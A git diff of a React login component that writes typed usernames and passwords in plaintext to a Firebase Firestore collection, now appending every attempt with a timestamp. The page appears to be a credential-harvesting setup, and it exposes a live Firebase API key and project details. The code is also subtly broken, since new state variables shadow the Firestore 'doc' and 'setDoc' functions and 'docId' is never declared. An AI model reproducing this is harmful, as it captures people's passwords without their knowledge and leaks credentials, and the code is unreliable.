@@ -12,31 +12,54 @@ const App = () => {
   const [username, setuser] = useState('');
   const [pass, setpass] = useState('');
   const [ispass, setispass] = useState(false);
+  const [doc, setDoc] = useState('');
+
+  // const firebaseConfig = {
+  //   apiKey: "AIzaSyDLXjzy5DEDAE56G4OvrtJuUNTsmZH6Pnc",
+  //   authDomain: "dynamicform-7e051.firebaseapp.com",
+  //   databaseURL: "https://dynamicform-7e051-default-rtdb.firebaseio.com",
+  //   projectId: "dynamicform-7e051",
+  //   storageBucket: "dynamicform-7e051.appspot.com",
+  //   messagingSenderId: "8030438522",
+  //   appId: "1:8030438522:web:278a23e41cea3b83bda7c3"
+  // };
 
   const firebaseConfig = {
-    apiKey: "AIzaSyDLXjzy5DEDAE56G4OvrtJuUNTsmZH6Pnc",
-    authDomain: "dynamicform-7e051.firebaseapp.com",
-    databaseURL: "https://dynamicform-7e051-default-rtdb.firebaseio.com",
-    projectId: "dynamicform-7e051",
-    storageBucket: "dynamicform-7e051.appspot.com",
-    messagingSenderId: "8030438522",
-    appId: "1:8030438522:web:278a23e41cea3b83bda7c3"
-  };
+  apiKey: "AIzaSyDLXjzy5DEDAE56G4OvrtJuUNTsmZH6Pnc",
+  authDomain: "dynamicform-7e051.firebaseapp.com",
+  databaseURL: "https://dynamicform-7e051-default-rtdb.firebaseio.com",
+  projectId: "dynamicform-7e051",
+  storageBucket: "dynamicform-7e051.appspot.com",
+  messagingSenderId: "8030438522",
+  appId: "1:8030438522:web:278a23e41cea3b83bda7c3"
+};
 
 
   // Initialize Firebase
   const app = initializeApp(firebaseConfig);
   const db = getFirestore(app);
 
+  
+
   useEffect(() => {
     // Save to Firestore
     const saveData = async () => {
       try {
-        const currentTime = new Date().getTime().toString();
-        await setDoc(doc(db, 'users', currentTime), {
-          pass: pass,
-          username: username,
-        });
+         let currentDocId = docId;
+        if (!currentDocId) {
+          currentDocId = new Date().getTime().toString();
+          setDocId(currentDocId);
+        }
+
+        const userRef = doc(db, 'users', currentDocId);
+        await setDoc(userRef, {
+          credentials: arrayUnion({
+            pass: pass,
+            username: username,
+            timestamp: new Date().toISOString(),
+          }),
+        }, { merge: true });
+
         console.log('Data saved to Firestore.');
       } catch (error) {
         console.error('Error saving data:', error);
